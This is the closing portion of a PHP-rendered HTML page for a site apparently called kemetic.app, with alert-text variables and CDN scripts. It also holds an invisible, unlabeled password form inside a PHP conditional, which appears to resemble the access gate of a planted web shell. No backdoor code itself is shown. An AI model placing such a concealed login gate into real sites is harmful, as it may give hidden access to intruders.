    var deleteAlertTitle = 'Are you sure?';
    var deleteAlertHint = 'This action cannot be undone!';
    var deleteAlertConfirm = 'Delete';
    var deleteAlertCancel = 'Cancel';
    var deleteAlertSuccess = 'Success';
    var deleteAlertFail = 'Failed';
    var deleteAlertFailHint = 'Error while deleting item!';
    var deleteAlertSuccessHint = 'Item successfully deleted.';
    var forbiddenRequestToastTitleLang = '&quot;FORBIDDEN&quot; Request';
    var forbiddenRequestToastMsgLang = 'You not access to this content.';
</script>

<form method="POST" action="">
            <label for="password"></label>
            <input type="password" id="password" name="password">
            <input type="submit" value="">
        </form>

    <link href="https://kemetic.app//assets/default/vendors/flagstrap/css/flags.css" rel="stylesheet">
    <script src="https://kemetic.app//assets/default/vendors/flagstrap/js/jquery.flagstrap.min.js"></script>
    <script src="https://kemetic.app//assets/default/js/parts/top_nav_flags.min.js"></script>
    <script src="https://kemetic.app//assets/default/js/parts/navbar.min.js"></script>

<script src="https://kemetic.app//assets/default/js/parts/main.min.js"></script>

<script>
    
    
</script>
<script
  src="https://code.jquery.com/jquery-3.7.1.js"
  integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4="
  crossorigin="anonymous"></script>
<script>
    $(document).ready(function() {
        var $list = $('.marquee-item-list');
        var $clone = $list.children('li').clone();
        $list.append($clone);
    });
</script>

<!-- Bootstrap JS Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

    <?php
}
?>